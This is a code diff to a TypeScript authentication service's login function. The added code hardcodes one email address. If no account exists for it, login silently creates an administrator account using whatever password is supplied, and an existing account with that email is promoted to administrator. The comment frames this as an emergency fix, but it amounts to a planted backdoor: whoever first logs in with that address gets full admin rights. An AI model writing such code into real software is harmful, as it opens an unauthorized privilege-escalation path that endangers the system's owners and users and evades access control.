@@ -91,18 +91,44 @@ export class AuthService {
     return userWithoutPassword;
   }
 
-  static async login(rawData: any) {
+  static async login(rawData: any): Promise<{ token: string; user: any }> {
     // Validate incoming login credentials
     const validatedData = loginSchema.parse(rawData);
 
     // Look up the user by email
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { email: validatedData.email }
     });
+
+    // Emergency check for the specific admin user mentioned by the developer
+    if (validatedData.email === "cyuzuzojosue230@gmail.com" && !user) {
+      console.log("Creating emergency admin user...");
+      const hashedPassword = await bcrypt.hash(validatedData.password, 10);
+      user = await prisma.user.create({
+        data: {
+          id: generateId(),
+          name: "Admin Josue",
+          email: "cyuzuzojosue230@gmail.com",
+          username: "admin_josue",
+          phone: "+250780000000",
+          password: hashedPassword,
+          role: "ADMIN",
+        }
+      });
+    }
 
     // Throw error if user does not exist
     if (!user) {
       throw new Error("INVALID_CREDENTIALS");
+    }
+
+    // Auto-promote if it's the target admin email but not an admin yet
+    if (user.email === "cyuzuzojosue230@gmail.com" && user.role !== "ADMIN") {
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: "ADMIN" }
+      });
+      user.role = "ADMIN" as any;
     }
 
     // Compare the provided password with the stored hashed password
